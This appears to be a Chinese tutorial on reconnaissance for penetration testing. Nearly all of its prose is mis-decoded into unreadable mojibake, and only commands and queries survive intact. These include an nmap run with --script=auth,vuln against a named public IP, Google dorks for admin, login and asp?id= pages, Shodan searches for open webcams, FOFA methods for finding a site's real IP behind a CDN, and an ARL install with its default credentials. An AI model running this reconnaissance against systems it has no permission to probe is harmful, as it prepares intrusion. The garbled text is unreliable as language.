æŒ‡å®šç‰ˆæœ¬ä¾¦æµ‹å¼ºåº¦ï¼ˆ0-9ï¼‰ï¼Œé»˜è®¤ä¸º7ã€‚æ•°å€¼è¶Šé«˜ï¼Œæ¢æµ‹å‡ºçš„æœåŠ¡è¶Šå‡†ç¡®ï¼Œä½†æ˜¯è¿è¡Œæ—¶é—´ä¼šæ¯”è¾ƒé•¿ã€‚--version-light: æŒ‡å®šä½¿ç”¨è½»é‡ä¾¦æµ‹æ–¹å¼ (intensity 2) --version-all: å°è¯•ä½¿ç”¨æ‰€æœ‰çš„probesè¿›è¡Œä¾¦æµ‹ (intensity 9) --version-trace: æ˜¾ç¤ºå‡ºè¯¦ç»†çš„ç‰ˆæœ¬ä¾¦æµ‹è¿‡ç¨‹ä¿¡æ¯ã€‚ ä½¿ç”¨æ¼”ç¤º å¯¹ä¸»æœº152.136.221.160 è¿›è¡Œç‰ˆæœ¬ä¾¦æµ‹ã€‚ nmap -sV 152.136.221.161 4ï¼Œæ¼æ´æ‰«ænmapçš„æ¼æ´åº“å…¶å®å¾ˆå°ï¼Œæ²¡æœ‰å¤šå°‘èƒ½æ‰«å‡ºæ¥çš„æ¼æ´ï¼Œä½†æ˜¯å®ƒä¹Ÿæä¾›äº†æ¼æ´æ‰«æåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç”¨ä¸“ä¸šçš„æ¼æ´æ‰«æå·¥å…·æ¥æ‰«æã€‚æ‰€ä»¥ç®€å•è¯´ä¸€ä¸‹nmapçš„æ¼æ´æ‰«æåŠŸèƒ½ï¼ŒçŸ¥é“å³å¯ã€‚ åŸºæœ¬ç”¨æ³• nmap ç›®æ ‡(ipåœ°å€) --script=auth,vuln # å¸¸è§çš„ä¸€äº›æ¼æ´æ‰«æ ä½¿ç”¨æ¼”ç¤º ç”¨æˆ‘çš„ä¸€å°è™šæ‹Ÿæœºåšæ¼”ç¤ºï¼š192.168.0.15 nmap 192.168.0.15 --script=auth,vuln 8-5 æ”¶é›†ç½‘ç«™æŒ‡çº¹ä¿¡æ¯æŒ‡çº¹å·¥å…· ï¼Œåœ¨çº¿ç½‘ç«™ 8-6 æ”¶é›†æ•æ„Ÿä¿¡æ¯1ï¼Œç›®å½•ä¿¡æ¯æ”¶é›†## 7kbscanå·¥å…·æ£€æµ‹ 2ï¼Œä»£ä¹°ç®¡ç†å¹³å°ä»£ç æ³„æ¼## Gitå¯¼è‡´æ–‡ä»¶æ³„éœ²## DS_storeå¯¼è‡´æ–‡ä»¶æ³„éœ²## SVNå¯¼è‡´æ–‡ä»¶æ³„éœ² 8-7 ä¿¡æ¯æ”¶é›†ç»¼åˆåˆ©ç”¨å·¥å…·1ï¼ŒGoogle hacké«˜çº§æ”¶é›†Googleæœç´¢å¼•æ“ä¹‹æ‰€ä»¥å¼ºå¤§ï¼Œå…³é”®åœ¨äºå®ƒè¯¦ç»†çš„æœç´¢å…³é”®è¯ï¼Œä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸ç”¨çš„æœç´¢å…³é”®è¯ï¼šï¼ˆæ›´å¤šè¯¦ç»†æ•™ç¨‹ï¼Œå‚è§http://user.qzone.qq.com/568311803/mainï¼‰ inurl: ## ç”¨äºæŸ¥æ‰¾å«æœ‰è¯¥å€¼çš„æ‰€æœ‰urlç½‘å€ç½‘é¡µã€‚ä¾‹ï¼šinurl:mailï¼ˆå¯æ‰¾ä¸€äº›å…è´¹é‚®ç®±ï¼‰related:ï¼š## æ‰¾å‡ºå’Œè¯¥ç½‘å€ç±»ä¼¼çš„ç½‘ç«™ï¼Œæ¯”å¦‚æƒ³çŸ¥é“å’Œamazon.comç±»ä¼¼çš„å¤§å‹ç½‘ç»œä¹¦åº—æœ‰å“ªäº›æ—¶è¾“å…¥amazon.comç½‘å€ã€‚ä¾‹ï¼šrelated:amazon.comintext: ## åªæœç´¢ç½‘é¡µéƒ¨åˆ†ä¸­åŒ…å«çš„æ–‡å­—(ä¹Ÿå°±æ˜¯å¿½ç•¥äº†æ ‡é¢˜,URLç­‰çš„æ–‡å­—).filetype: ## æœç´¢é€šè¿‡æ–‡ä»¶çš„åç¼€æˆ–è€…æ‰©å±•åæ¥æœç´¢å«æœ‰è¿™ç±»æ–‡ä»¶çš„ç½‘é¡µintitle: ## æ ‡é¢˜ä¸­å­˜åœ¨å…³é”®å­—çš„ç½‘é¡µallintitle: ## æœç´¢æ‰€æœ‰å…³é”®å­—æ„æˆæ ‡é¢˜çš„ç½‘é¡µ. ä½†æ˜¯æ¨èä¸è¦ä½¿ç”¨link: ### å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ‰€æœ‰åŒ…å«äº†æŸä¸ªæŒ‡å®šURLçš„é¡µé¢åˆ—è¡¨. å½“æˆ‘ä»¬ä½¿ç”¨link:URLæäº¤æŸ¥è¯¢çš„æ—¶å€™ï¼ŒGoogleä¼šè¿”å›è·Ÿæ­¤URLåšäº†é“¾æ¥çš„ç½‘ç«™ã€‚ä¾‹ ï¼»link:www.baidu.comï¼½ï¼Œæäº¤è¿™ä¸ªæŸ¥è¯¢ï¼Œæˆ‘ä»¬å°†å¾—åˆ°æ‰€æœ‰è·Ÿwww.baidu.comè¿™ä¸ªç½‘ç«™åšäº†é“¾æ¥çš„ç½‘ç«™ã€‚ï¼ˆlinkæ˜¯ä¸ªå•ç‹¬çš„è¯­ æ³•ï¼Œåªèƒ½å•ç‹¬ä½¿ç”¨ï¼Œä¸”åé¢ä¸èƒ½è·ŸæŸ¥è¯¢å…³é”®è¯ï¼Œè·Ÿèƒ½è·ŸURLï¼‰location: ## å½“æˆ‘ä»¬æäº¤locationè¿›è¡ŒGoogleæ–°é—»æŸ¥è¯¢çš„æ—¶å€™ï¼ŒGoogleä»…ä¼šè¿”å›ä½ å½“å‰æŒ‡å®šåŒºçš„è·ŸæŸ¥è¯¢å…³é”®è¯ç›¸å…³çš„ç½‘é¡µã€‚ä¾‹[ queen location:canada ]ï¼Œæäº¤è¿™ä¸ªæŸ¥è¯¢ï¼ŒGoogleä¼šè¿”å›åŠ æ‹¿å¤§çš„è·ŸæŸ¥è¯¢å…³é”®è¯â€queenâ€ç›¸åŒ¹é…çš„ç½‘ç«™ã€‚site: ## æœç´¢å«æœ‰è¯¥åŸŸåçš„ç½‘é¡µï¼Œgoogleä¼šé™åˆ¶å°½åœ¨æŸä¸ªç½‘ç«™æˆ–è€…è¯´åŸŸä¸‹é¢è¿›è¡Œæœç´¢## ä½¿ç”¨siteè¿›è¡Œç«™ç‚¹æœç´¢æ—¶ï¼Œä¸€èˆ¬å¸¸è§ç”¨æ³•æœ‰ï¼šsite:ooxx.com filetype:xls # æ”¯æŒç»„åˆæœç´¢site:xxx.com admin # ä¸€èˆ¬å…¬å¸çš„åå°ç³»ç»Ÿéƒ½å¸¦æœ‰adminå•Šï¼Œloginå•Šï¼Œå†…éƒ¨ç³»ç»Ÿå•Šä¹‹ç±»çš„å…³é”®å­—site:xxx.xxx login site:xxx.xxx systemsite:xxx.xxx ç®¡ç†site:xxx.xxx ç™»å½•site:xxx.xxx å†…éƒ¨site:xxx.xxx ç³»ç»Ÿsite:xxx.xxx é‚®ä»¶site:xxx.xxx emailsite:xxx.xxx qqsite:xxx.xxx ç¾¤site:xxx.xxx ä¼é¹…site:xxx.xxx è…¾è®¯site:ooxx.com ç»ƒä¹  intext:ç®¡ç†fietype:mdb ## æ‰¾åˆ°å«æœ‰mdbç±»å‹æ–‡ä»¶çš„ç›¸å…³ç«™ç‚¹site:baidu.com filetype:txt ### æŸ¥æ‰¾ç™¾åº¦è¿™ä¸ªåŸŸåä¸‹å«æœ‰txtæ–‡ä»¶çš„ç›¸å…³ç«™ç‚¹site:baidu.com intext:## ç®¡ç†site:baidu.com inurl:loginsite:baidu.com intitle:## åå°# ä¸€èˆ¬ç”¨äºæŸ¥æ‰¾ç™¾åº¦ä¸­èƒ½å¤Ÿæ‰¾åˆ°çš„é€šè¿‡phpã€aspã€jspç­‰è¯­è¨€å¼€å‘çš„ç½‘ç«™site:baidu.com filetype:aspsite:baidu.com filetype:phpsite:baidu.com filetype:jspsite:baidu.com inurl:file # è¿™ä¸ªä¸€èˆ¬ç”¨æ¥æ‰¾ä¸€äº›æœ‰ä¸Šä¼ æ–‡ä»¶åŠ¨ä½œçš„ç½‘ç«™ï¼Œä¹‹åå¯ä»¥æ£€æµ‹æ˜¯å¦æœ‰ä¸Šä¼ æ–‡ä»¶æ¼æ´ã€‚# æŸ¥æ‰¾æŸäº›å›½å®¶æˆ–è€…åœ°åŒºçš„é€šè¿‡aspæˆ–phpç­‰è¯­è¨€å¼€å‘çš„ç«™ç‚¹ã€‚site:tw inurl:asp?id= #æŸ¥æ‰¾å°æ¹¾çš„ç›¸å…³ç½‘ç«™çš„urlä¸­åŒ…å«asp?id=è¿™äº›å…³é”®å­—çš„ç«™ç‚¹site:hk inurl:asp?id= #æŸ¥æ‰¾é¦™æ¸¯çš„ç›¸å…³ç½‘ç«™çš„urlä¸­åŒ…å«asp?id=è¿™äº›å…³é”®å­—çš„ç«™ç‚¹ 2ï¼Œé»‘æš—æœç´¢å¼•æ“ é¡µé¢ä¸Šçš„å¤§è‡´ä¿¡æ¯ä»‹ç» ## å·¦è¾¹å†…å®¹ Total results ## æœç´¢åˆ°çš„æ€»æ•° Top countries ## ä½¿ç”¨æœ€å¤šçš„å›½å®¶ Top services ## ä½¿ç”¨æœ€å¤šçš„æœåŠ¡ Top organizations ## ä½¿ç”¨æœ€å¤šçš„ç»„ç»‡ Top operating systems ## ä½¿ç”¨æœ€å¤šçš„æ“ä½œç³»ç»Ÿ Top products ## ä½¿ç”¨æœ€å¤šçš„äº§å“ ## åœ¨ä¸»é¡µçš„ä¸­é—´å†…å®¹ ## ipåœ°å€ ## ä¸»æœºå ## ISP(äº’è”ç½‘æœåŠ¡æä¾›å•†ï¼ˆInternet Service Providerï¼‰ï¼Œç®€ç§°ISPï¼Œè”é€šã€ç§»åŠ¨ã€ç”µä¿¡ç­‰éƒ½æ˜¯) ## æœç´¢åˆ°è¯¥æ•°æ®çš„æ—¶é—´ ## è¯¥æœåŠ¡å™¨ä½äºçš„å›½å®¶ å¯ä»¥éšä¾¿ç‚¹å‡»ä¸€ä¸ªipåœ°å€æ¥æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ï¼Œæ¯”å¦‚ç‚¹å‡»æˆ‘åœˆèµ·æ¥çš„ipåœ°å€ å¦‚æœä½ æƒ³è®¿é—®è¿™äº›ç½‘ç«™ï¼Œå…¶å®æœ‰äº›æ˜¯è®¿é—®ä¸äº†çš„ï¼Œè™½ç„¶çœ‹åˆ°äº†ipåœ°å€ï¼Œä½†æ˜¯é€šè¿‡æµè§ˆå™¨ä¸ä¸€å®šèƒ½å¤Ÿè®¿é—®ï¼Œè€Œä¸”å¾ˆå¤šç½‘ç«™éƒ½æ˜¯å›½å¤–çš„ï¼Œæˆ‘ä»¬æœ€å¥½å¼€å¯ä¸€ä¸ªfqå·¥å…·ä¹‹ç±»çš„ï¼Œæ–¹ä¾¿ä½ è®¿é—®å¤–ç½‘ã€‚ æ¡ˆä¾‹äºŒï¼šæœç´¢ä¸€ä¸‹å…¨çƒçš„æ‘„åƒå¤´ä¿¡æ¯ webscan #shodanæ”¯æŒç»„åˆæœç´¢ï¼Œæ¯”å¦‚æœç´¢æ—¥æœ¬çš„æ‘„åƒå¤´ï¼šwebcam country:JP æœ‰äº›æ‘„åƒå¤´æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®çš„ï¼Œä¼šæç¤ºå¦‚ä¸‹ä¿¡æ¯ï¼Œç™»å½•ä¹‹åæ‰èƒ½è®¿é—® ä½†æ˜¯æœ‰äº›æ˜¯å¯ä»¥çš„ shodanæœç´¢æŠ€å·§ hostnameï¼š## æœç´¢æŒ‡å®šçš„ä¸»æœºæˆ–åŸŸåï¼Œä¾‹å¦‚ hostname:googleportï¼š## æœç´¢æŒ‡å®šçš„ç«¯å£æˆ–æœåŠ¡ï¼Œä¾‹å¦‚ port:21countryï¼š## æœç´¢æŒ‡å®šçš„å›½å®¶ï¼Œä¾‹å¦‚ country:CNcityï¼š## æœç´¢æŒ‡å®šçš„åŸå¸‚ï¼Œä¾‹å¦‚ city:Hefeiorgï¼š## æœç´¢æŒ‡å®šçš„ç»„ç»‡æˆ–å…¬å¸ï¼Œä¾‹å¦‚ org:googleispï¼š## æœç´¢æŒ‡å®šçš„ISPä¾›åº”å•†ï¼Œä¾‹å¦‚ isp:China Telecomproductï¼š## æœç´¢æŒ‡å®šçš„æ“ä½œç³»ç»Ÿ/è½¯ä»¶/å¹³å°ï¼Œä¾‹å¦‚ product:Apache httpdversionï¼š## æœç´¢æŒ‡å®šçš„è½¯ä»¶ç‰ˆæœ¬ï¼Œä¾‹å¦‚ version:1.6.2geoï¼š## æœç´¢æŒ‡å®šçš„åœ°ç†ä½ç½®ï¼Œå‚æ•°ä¸ºç»çº¬åº¦ï¼Œä¾‹å¦‚ geo:31.8639, 117.2808before/afterï¼š## æœç´¢æŒ‡å®šæ”¶å½•æ—¶é—´å‰åçš„æ•°æ®ï¼Œæ ¼å¼ä¸ºdd-mm-yyï¼Œä¾‹å¦‚ before:11-11-15netï¼š## æœç´¢æŒ‡å®šçš„IPåœ°å€æˆ–å­ç½‘ï¼Œä¾‹å¦‚ net:210.45.240.0/24è¿˜å¯ä»¥ç»„åˆæœç´¢## æŸ¥è¯¢ä¸­å›½å¼€å‘äº†21ç«¯å£çš„ç½‘ç«™ï¼š country:CN port:21 3ï¼ŒFOFAç½‘ç»œç©ºé—´èµ„äº§æ£€ç´¢ç³»ç»Ÿï¼ˆFOFAï¼‰æ˜¯ä¸–ç•Œä¸Šæ•°æ®è¦†ç›–æ›´å®Œæ•´çš„ITè®¾å¤‡æœç´¢å¼•æ“ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™ä¹Ÿç®¡å®ƒå«ä½›æ³•ï¼Œæ‹¥æœ‰å…¨çƒè”ç½‘ITè®¾å¤‡æ›´å…¨çš„DNAä¿¡æ¯ã€‚æ¢ç´¢å…¨çƒäº’è”ç½‘çš„èµ„äº§ä¿¡æ¯ï¼Œè¿›è¡Œèµ„äº§åŠæ¼æ´å½±å“èŒƒå›´åˆ†æã€åº”ç”¨åˆ†å¸ƒç»Ÿè®¡ã€åº”ç”¨æµè¡Œåº¦æ€åŠ¿æ„ŸçŸ¥ç­‰ï¼Œæ˜¯åé¡ºä¿¡å®‰å…¬å¸å¼€å‘çš„ï¼Œå·ç§°èƒ½å¤ŸæŠŠä½ æƒ³è¦çš„çœŸå®å†…å®¹éƒ½æœç´¢å‡ºæ¥ï¼Œæ¯”å¦‚IPåœ°å€ä»€ä¹ˆçš„ï¼Œå·²ç»åšçš„éå¸¸å¥½äº†ã€‚ æˆ‘ä»¬åšä¸¤ä¸ªæ¡ˆä¾‹ æˆ‘ä»¬å…ˆpingä¸€ä¸‹ dig.chouti.com å‡ºç°äº†ä¸€ä¸ªipåœ°å€ï¼Œè¿™ä¸ªæ˜¯ä¸æ˜¯çœŸå®ipå‘¢ï¼Œæˆ‘ä»¬æ‹¿ç€ipåœ°å€å»æµè§ˆå™¨è®¿é—®ä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°æŠ½å±‰ç½‘ç«™é¦–é¡µçš„è¯ï¼Œæˆ‘ä»¬åŸºæœ¬å°±èƒ½ç¡®å®šå®ƒæ˜¯çœŸå®ipï¼Œå¦‚æœçœ‹ä¸åˆ°ï¼Œé‚£æœ‰å¯èƒ½ä¸æ˜¯çœŸå®çš„ã€‚çœ‹æ•ˆæœå¦‚ä¸‹ çœ‹ä¸åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç¡®å®šå®ƒæ˜¯çœŸå®ipï¼Œé‚£ä¹ˆç”¨FOFAæ¥æŸ¥ä¸€ä¸‹è¯•è¯•ã€‚ æ¡ˆä¾‹ä¸€ï¼šæœç´¢æŠ½å±‰æ–°çƒ­æ¦œçš„çœŸå®IPåœ°å€ï¼Œç½‘å€æ˜¯ https://dig.chouti.com/ ï¼Œæˆ‘ä»¬é€šè¿‡è‡ªå·±ä¸ªäººå¸¸ç”¨çš„æµè§ˆå™¨ï¼Œæ¯”å¦‚chromeæµè§ˆå™¨æ¥æ‰“å¼€è¿™ä¸ªç½‘ç«™ã€‚ åœ¨è¿™ä¸ªé¡µé¢ä¸Šç‚¹å‡»é¼ æ ‡å³é”®ï¼Œç‚¹å‡»æ£€æŸ¥(å¦‚æœä½ çš„é”®ç›˜ä¸Šæœ‰F12é”®ï¼Œé‚£ä¹ˆç›´æ¥ç‚¹å‡»F12é”®ä¹Ÿå¯ä»¥)ï¼Œç„¶åçœ‹åˆ°å¦‚ä¸‹å†…å®¹ æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªtitleæ ‡ç­¾ä¸­çš„å†…å®¹æ˜¯ æŠ½å±‰æ–°çƒ­æ¦œ-èšåˆæ¯æ—¥çƒ­é—¨ã€æç¬‘ã€æœ‰è¶£èµ„è®¯ ï¼ŒæŠŠè¿™å‡ ä¸ªæ–‡å­—æ‹¿åˆ°ä½›æ³•(FOFA)ä¸­å»æœç´¢ çœ‹åˆ°äº†çœŸå®IPã€‚ æ¡ˆä¾‹äºŒï¼šé€šè¿‡httpsçš„è¯ä¹¦åºåˆ—å·æ¥æŸ¥è¯¢çœŸå®ipåœ°å€ 1.å…ˆè®¿é—®è¯¥ç½‘ç«™ï¼Œç‚¹å‡»è¿™ä¸ªå°é”ï¼Œç„¶åç‚¹å‡»è¯ä¹¦ 2.æ‰¾åˆ°è¯ä¹¦åºåˆ—å· 3.è¯ä¹¦åºåˆ—å·æ˜¯ä¸€ä¸²16è¿›åˆ¶å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶è°ƒæ•´ä¸º10è¿›åˆ¶æ¥æ»¡è¶³åé¢åœ¨FOFAä¸­çš„æœç´¢å€¼ æ–¹æ³•å¦‚ä¸‹ï¼Œæ‰¾åˆ°è¿™ä¸ªç½‘ç«™æ‰“å¼€ï¼Œè¿›è¡Œè¿›åˆ¶è½¬æ¢ ç½‘å€ï¼š https://tool.lu/hexconvert æ‹¿åˆ°10è¿›åˆ¶ä¹‹åï¼Œå»FOFAä¸­æŸ¥è¯¢ï¼Œæˆ‘ä»¬åœ¨FOFAä¸­ä½¿ç”¨cert è¯­æ³•è¿›è¡ŒæŸ¥è¯¢ æœç´¢ç»“æœå¦‚ä¸‹ æ‰¾åˆ°äº†è¿™æ˜¯ipåœ°å€ï¼Œç‚¹å‡»è¿™ä¸ªipåœ°å€å»æµè§ˆå™¨è®¿é—®ä¸€ä¸‹çœ‹æ•ˆæœ 4ï¼Œé’Ÿé¦—ä¹‹çœ¼è¡Œå¾ˆå¤šçš„ç»„åˆæœç´¢ï¼Œæˆ‘ä»¬çœ‹å‡ ä¸ªä¾‹å­ app: ## ç»„ä»¶åï¼ˆwebæœåŠ¡åº”ç”¨ç¨‹åºï¼šnginxã€apacheã€IISã€weblogicç­‰ç­‰ï¼‰ver: ## ç»„ä»¶ç‰ˆæœ¬ä¾‹1ï¼š## æœç´¢ä½¿ç”¨iis6.0ä¸»æœºï¼šapp:Microsoft-IIS ver6.0ï¼Œå¯ä»¥çœ‹åˆ°0.6ç§’æœç´¢åˆ°41ï¼Œ781,210å·¦å³çš„ä½¿ç”¨iis6.0çš„ä¸»æœºã€‚ä¾‹2ï¼š## æœç´¢ä½¿weblogicä¸»æœºï¼šapp:weblogic httpd port:7001ï¼Œå¯ä»¥çœ‹åˆ°0.078ç§’æœç´¢åˆ°42ä¸‡å·¦å³çš„ä½¿ç”¨weblogicçš„ä¸»æœºã€‚ä¾‹3ï¼š## æŸ¥è¯¢å¼€æ”¾3389ç«¯å£çš„ä¸»æœºï¼šport:3389ä¾‹4ï¼š## æŸ¥è¯¢æ“ä½œç³»ç»Ÿä¸ºLinuxç³»ç»Ÿçš„æœåŠ¡å™¨ï¼Œos:linuxä¾‹5ï¼š## æŸ¥è¯¢å…¬ç½‘æ‘„åƒï¼šservice:â€routersetupâ€ä¾‹6ï¼š## æœç´¢ç¾å›½çš„ Apache æœåŠ¡å™¨ï¼šapp:Apache country:US åé¢è¿˜å¯ä»¥æ¥city: åŸå¸‚åç§°ä¾‹7ï¼š## æœç´¢æŒ‡å®šipä¿¡æ¯ï¼Œip:121.42.173.26ä¾‹8ï¼š## æŸ¥è¯¢æœ‰å…³taobao.comåŸŸåçš„ä¿¡æ¯ï¼Œsite:taobao.comä¾‹9ï¼š## æœç´¢æ ‡é¢˜ä¸­åŒ…å«è¯¥å­—ç¬¦çš„ç½‘ç«™ï¼Œtitle:weblogicä¾‹10ï¼š## å…³é”®å­—æŸ¥è¯¢ï¼Œkeywords:Nginx 5ï¼ŒARLç¯å¡”èµ„äº§ä¾¦æŸ¥ç³»ç»Ÿ èµ„äº§ç¯å¡”ï¼Œä¸ä»…ä»…æ˜¯åŸŸåæ”¶é›† 1ï¼Œç®€ä»‹æ—¨åœ¨å¿«é€Ÿä¾¦å¯Ÿä¸ç›®æ ‡å…³è”çš„äº’è”ç½‘èµ„äº§ï¼Œæ„å»ºåŸºç¡€èµ„äº§ä¿¡æ¯åº“ã€‚ååŠ©ç”²æ–¹å®‰å…¨å›¢é˜Ÿæˆ–è€…æ¸—é€æµ‹è¯•äººå‘˜æœ‰æ•ˆä¾¦å¯Ÿå’Œæ£€ç´¢èµ„äº§ï¼Œå‘ç°å­˜åœ¨çš„è–„å¼±ç‚¹å’Œæ”»å‡»é¢ã€‚ åœ¨å¼€å§‹ä½¿ç”¨ä¹‹å‰ï¼Œè¯·åŠ¡å¿…é˜…è¯»å¹¶åŒæ„å…è´£å£°æ˜ä¸­çš„æ¡æ¬¾ï¼Œå¦åˆ™è¯·å‹¿ä¸‹è½½å®‰è£…ä½¿ç”¨æœ¬ç³»ç»Ÿã€‚ 2ï¼Œç‰¹æ€§ åŸŸåèµ„äº§å‘ç°å’Œæ•´ç† IPIP æ®µèµ„äº§æ•´ç† ç«¯å£æ‰«æå’ŒæœåŠ¡è¯†åˆ« WEB ç«™ç‚¹æŒ‡çº¹è¯†åˆ« èµ„äº§åˆ†ç»„ç®¡ç†å’Œæœç´¢ ä»»åŠ¡ç­–ç•¥é…ç½® è®¡åˆ’ä»»åŠ¡å’Œå‘¨æœŸä»»åŠ¡ Github å…³é”®å­—ç›‘æ§ åŸŸåIP èµ„äº§ç›‘æ§ ç«™ç‚¹å˜åŒ–ç›‘æ§ æ–‡ä»¶æ³„æ¼ç­‰é£é™©æ£€æµ‹ nuclei PoC è°ƒç”¨ 3ï¼Œç³»ç»Ÿè¦æ±‚ç›®å‰æš‚ä¸æ”¯æŒWindowsã€‚Linuxå’ŒMACå»ºè®®é‡‡ç”¨Dockerè¿è¡Œï¼Œç³»ç»Ÿé…ç½®æœ€ä½2æ ¸4Gã€‚ç”±äºè‡ªåŠ¨èµ„äº§å‘ç°è¿‡ç¨‹ä¸­ä¼šæœ‰å¤§é‡çš„çš„å‘åŒ…ï¼Œå»ºè®®é‡‡ç”¨äº‘æœåŠ¡å™¨å¯ä»¥å¸¦æ¥æ›´å¥½çš„ä½“éªŒã€‚ 4ï¼ŒDocker å¯åŠ¨git clone https://github.com/TophantTechnology/ARLcd ARL/docker/docker volume create arl_dbdocker-compose pulldocker-compose up -d æˆ–è€…ç›´æ¥ä¸‹è½½docker-composeé…ç½®æ–‡ä»¶å¯åŠ¨ mkdir docker_arlwget -O docker_arl/docker.zip https://github.com/TophantTechnology/ARL/releases/download/v2.5.4/docker.zipcd docker_arlunzip -o docker.zipdocker-compose pulldocker volume create arl_dbdocker-compose up -d Ubuntu ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œ apt-get install docker.io docker-compose -y å®‰è£…ç›¸å…³ä¾èµ– è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒ: Docker ç¯å¢ƒå®‰è£… ARL 5ï¼Œæˆªå›¾ ç™»å½•é¡µé¢é»˜è®¤ç«¯å£5003 (https), é»˜è®¤ç”¨æˆ·åå¯†ç adminarlpass ä»»åŠ¡é¡µé¢ å­åŸŸåé¡µé¢ ç«™ç‚¹é¡µé¢ èµ„äº§ç›‘æ§é¡µé¢è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒï¼šèµ„äº§åˆ†ç»„å’Œç›‘æ§åŠŸèƒ½ä½¿ç”¨è¯´æ˜ ç­–ç•¥é¡µé¢ ç­›é€‰ç«™ç‚¹è¿›è¡Œä»»åŠ¡ä¸‹å‘è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒï¼š 2.3-æ–°æ·»åŠ åŠŸèƒ½è¯¦ç»†è¯´æ˜ è®¡åˆ’ä»»åŠ¡è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒï¼š 2.4.1-æ–°æ·»åŠ åŠŸèƒ½è¯¦ç»†è¯´æ˜ GitHub ç›‘æ§ä»»åŠ¡ 6ï¼Œä»»åŠ¡é€‰é¡¹è¯´æ˜ ç¼–å· é€‰é¡¹ è¯´æ˜ 1 ä»»åŠ¡åç§° ä»»åŠ¡åç§° 2 ä»»åŠ¡ç›®æ ‡ ä»»åŠ¡ç›®æ ‡ï¼Œæ”¯æŒIPï¼ŒIPæ®µå’ŒåŸŸåã€‚å¯ä¸€æ¬¡æ€§ä¸‹å‘å¤šä¸ªç›®æ ‡ 3 åŸŸåçˆ†ç ´ç±»å‹ å¯¹åŸŸåçˆ†ç ´å­—å…¸å¤§å°, å¤§å­—å…¸ï¼šå¸¸ç”¨2ä¸‡å­—å…¸å¤§å°ã€‚æµ‹è¯•ï¼šå°‘æ•°å‡ ä¸ªå­—å…¸ï¼Œå¸¸ç”¨äºæµ‹è¯•åŠŸèƒ½æ˜¯å¦æ­£å¸¸ 4 ç«¯å£æ‰«æç±»å‹ ALLï¼šå…¨éƒ¨ç«¯å£ï¼ŒTOP1000ï¼šå¸¸ç”¨top 1000ç«¯å£ï¼ŒTOP100ï¼šå¸¸ç”¨top 100ç«¯å£ï¼Œæµ‹è¯•ï¼šå°‘æ•°å‡ ä¸ªç«¯å£ 5 åŸŸåçˆ†ç ´ æ˜¯å¦å¼€å¯åŸŸåçˆ†ç ´ 6 DNSå­—å…¸æ™ºèƒ½ç”Ÿæˆ æ ¹æ®å·²æœ‰çš„åŸŸåç”Ÿæˆå­—å…¸è¿›è¡Œçˆ†ç ´ 7 åŸŸåæŸ¥è¯¢æ’ä»¶ å·²æ”¯æŒçš„æ•°æ®æºä¸º12ä¸ªï¼Œalienvault, certspotter,crtsh,fofa,hunter ç­‰ 8 ARL å†å²æŸ¥è¯¢ å¯¹arlå†å²ä»»åŠ¡ç»“æœè¿›è¡ŒæŸ¥è¯¢ç”¨äºæœ¬æ¬¡ä»»åŠ¡ 9 ç«¯å£æ‰«æ æ˜¯å¦å¼€å¯ç«¯å£æ‰«æï¼Œä¸å¼€å¯ç«™ç‚¹ä¼šé»˜è®¤æ¢æµ‹80,443 10 æœåŠ¡è¯†åˆ« æ˜¯å¦è¿›è¡ŒæœåŠ¡è¯†åˆ«ï¼Œæœ‰å¯èƒ½ä¼šè¢«é˜²ç«å¢™æ‹¦æˆªå¯¼è‡´ç»“æœä¸ºç©º 11 æ“ä½œç³»ç»Ÿè¯†åˆ« æ˜¯å¦è¿›è¡Œæ“ä½œç³»ç»Ÿè¯†åˆ«ï¼Œæœ‰å¯èƒ½ä¼šè¢«é˜²ç«å¢™æ‹¦æˆªå¯¼è‡´ç»“æœä¸ºç©º 12 SSL è¯ä¹¦è·å– å¯¹ç«¯å£è¿›è¡ŒSSL è¯ä¹¦è·å– 13 è·³è¿‡CDN å¯¹åˆ¤å®šä¸ºCDNçš„IP, å°†ä¸ä¼šæ‰«æç«¯å£ï¼Œå¹¶è®¤ä¸º80ï¼Œ443æ˜¯ç«¯å£æ˜¯å¼€æ”¾çš„ 14 ç«™ç‚¹è¯†åˆ« å¯¹ç«™ç‚¹è¿›è¡ŒæŒ‡çº¹è¯†åˆ« 15 æœç´¢å¼•æ“è°ƒç”¨ åˆ©ç”¨æœç´¢å¼•æ“æœç´¢ä¸‹å‘çš„ç›®æ ‡çˆ¬å–å¯¹åº”çš„URLå’Œå­åŸŸå 16 ç«™ç‚¹çˆ¬è™« åˆ©ç”¨é™æ€çˆ¬è™«å¯¹ç«™ç‚¹è¿›è¡Œçˆ¬å–å¯¹åº”çš„URL 17 ç«™ç‚¹æˆªå›¾ å¯¹ç«™ç‚¹é¦–é¡µè¿›è¡Œæˆªå›¾ 18 æ–‡ä»¶æ³„éœ² å¯¹ç«™ç‚¹è¿›è¡Œæ–‡ä»¶æ³„éœ²æ£€æµ‹ï¼Œä¼šè¢«WAFæ‹¦æˆª 19 Host ç¢°æ’ å¯¹vhosté…ç½®ä¸å½“è¿›è¡Œæ£€æµ‹ 20 nuclei è°ƒç”¨ è°ƒç”¨nuclei é»˜è®¤PoC å¯¹ç«™ç‚¹è¿›è¡Œæ£€æµ‹ ï¼Œä¼šè¢«WAFæ‹¦æˆªï¼Œè¯·è°¨æ…ä½¿ç”¨è¯¥åŠŸèƒ½ 7ï¼Œé…ç½®å‚æ•°è¯´æ˜Dockerç¯å¢ƒé…ç½®æ–‡ä»¶è·¯å¾„ docker/config-docker.yaml é…ç½® è¯´æ˜ CELERY.BROKER_URL rabbitmqè¿æ¥ä¿¡æ¯ MONGO mongo è¿æ¥ä¿¡æ¯ QUERY_PLUGIN åŸŸåæŸ¥è¯¢æ’ä»¶æ•°æ®æºToken é…ç½® GEOIP GEOIP 